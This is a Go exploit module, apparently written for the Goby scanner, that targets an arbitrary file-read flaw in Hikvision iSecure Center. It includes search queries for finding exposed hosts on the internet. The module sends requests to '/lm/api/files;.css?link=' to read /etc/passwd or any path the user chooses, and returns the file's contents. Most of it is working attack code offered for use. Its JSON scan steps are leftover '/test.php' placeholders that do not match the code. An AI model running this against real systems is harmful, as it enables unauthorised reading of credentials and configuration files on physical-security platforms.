package exploits

import (
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "HIKVISION iSecure Center /lm/api/files File link Parameter File Read Vulnerability",
    "Description": "<p>The comprehensive security management platform iSecure Center by Hikvision has a file read vulnerability in the /lm/api/files endpoint, allowing attackers to read arbitrary files on the server.HIKVISION iSecure Center Comprehensive Security Management Platform is designed for security and environmental protection departments, primarily used for safety production supervision. It integrates subsystems such as video capture, security management, access control, intrusion prevention, checkpoint management, environmental monitoring, and fire monitoring. By utilizing IoT technology centered around video and combining AI technology, it meets the requirements of comprehensive security and safety management operations in ports. It promptly identifies security risks, prevents accidents, and safeguards port security.</p>",
    "Product": "HIKVISION-iSecure-Center",
    "Homepage": "https://www.hikvision.com/",
    "DisclosureDate": "2024-04-24",
    "PostTime": "2024-04-29",
    "Author": "兰公子",
    "FofaQuery": "body=\"portal/lida-icon/lidaicon.css\" || (body=\"/error/browser.do\" && body=\"/nginxService/v1/download/InstallRootCert.exe\") || body=\"/portal/ui/static/\" ",
    "GobyQuery": "body=\"portal/lida-icon/lidaicon.css\" || (body=\"/error/browser.do\" && body=\"/nginxService/v1/download/InstallRootCert.exe\") || body=\"/portal/ui/static/\" ",
    "Level": "1",
    "Impact": "<p>The comprehensive security management platform iSecure Center by Hikvision has a file read vulnerability in the /lm/api/files endpoint, allowing attackers to read arbitrary files on the server.</p>",
    "Recommendation": "<p>1. Contact the manufacturer to obtain measures for fixing the vulnerability.</p><p>2. Set up access policies through firewalls and other security devices to allow access only from whitelisted sources.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "Customize,passwd",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "/etc/passwd",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read",
        "HW-2023"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.6",
    "Translation": {
        "CN": {
            "Name": "海康威视 iSecure Center /lm/api/files 文件 link 参数 文件读取漏洞",
            "Product": "HIKVISION-iSecure-Center",
            "Description": "<p>海康威视iSecure Center 综合安防管理平台是面向安全环保部门，应用于安全生产监管，集成视频采集、安全管理、出入管控、入侵防范、卡口、环境监测和消防监测等子系统。采用以视频为核心的物联网技术，结合AI技术，实现港区综合安防和安全作业管理业务需求，及时识别安全隐患，预防事故发生，保障港口安全。</p><p>海康威视 iSecure Center 综合安防管理平台 /lm/api/files&nbsp;存在文件读取漏洞，攻击者可通过该漏洞读取服务器内的任意文件。</p>",
            "Recommendation": "<p>1、联系厂商获取修复漏洞措施</p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。&nbsp;</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>海康威视 iSecure Center 综合安防管理平台&nbsp;/lm/api/files&nbsp;存在文件读取漏洞，攻击者可通过该漏洞读取服务器内的任意文件。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取",
                "HW-2023"
            ]
        },
        "EN": {
            "Name": "HIKVISION iSecure Center /lm/api/files File link Parameter File Read Vulnerability",
            "Product": "HIKVISION-iSecure-Center",
            "Description": "<p>The comprehensive security management platform iSecure Center by Hikvision has a file read vulnerability in the /lm/api/files endpoint, allowing attackers to read arbitrary files on the server.HIKVISION iSecure Center Comprehensive Security Management Platform is designed for security and environmental protection departments, primarily used for safety production supervision. It integrates subsystems such as video capture, security management, access control, intrusion prevention, checkpoint management, environmental monitoring, and fire monitoring. By utilizing IoT technology centered around video and combining AI technology, it meets the requirements of comprehensive security and safety management operations in ports. It promptly identifies security risks, prevents accidents, and safeguards port security.</p>",
            "Recommendation": "<p>1. Contact the manufacturer to obtain measures for fixing the vulnerability.</p><p>2. Set up access policies through firewalls and other security devices to allow access only from whitelisted sources.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>The comprehensive security management platform iSecure Center by Hikvision has a file read vulnerability in the /lm/api/files endpoint, allowing attackers to read arbitrary files on the server.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read",
                "HW-2023"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10967"
}`

	postOrGet_uuYhh8 := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		// 文件请求函数
		getRequest := func(hostInfo *httpclient.FixUrl, url string, requestMap map[string]string) (*httpclient.HttpResponse, error) {
			makeRequest := httpclient.NewGetRequestConfig(url)
			makeRequest.VerifyTls = false
			makeRequest.Timeout = 5
			makeRequest.FollowRedirect = false
			if requestMap != nil {
				for postHeaderKey, postHeaderValue := range requestMap {
					makeRequest.Header.Store(postHeaderKey, postHeaderValue)
				}
			}
			return httpclient.DoHttpRequest(hostInfo, makeRequest)
		}
		Result, err := getRequest(hostInfo, `/lm/api/files;.css?link=`+fileUrl, nil)
		if err != nil {
			return "", err
		}
		// 注意：返回值为（最终要返回的读取结果，错误）
		return Result.Utf8Html, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := `/lm/api/files`
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"/etc/passwd": "root",
			}
			// 函数继承
			uploadFileFunc := postOrGet_uuYhh8

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"passwd": {"/etc/passwd", "root"},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_uuYhh8

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}

			expResult.Success = true
			expResult.Output = resp
			return expResult
		}))
}
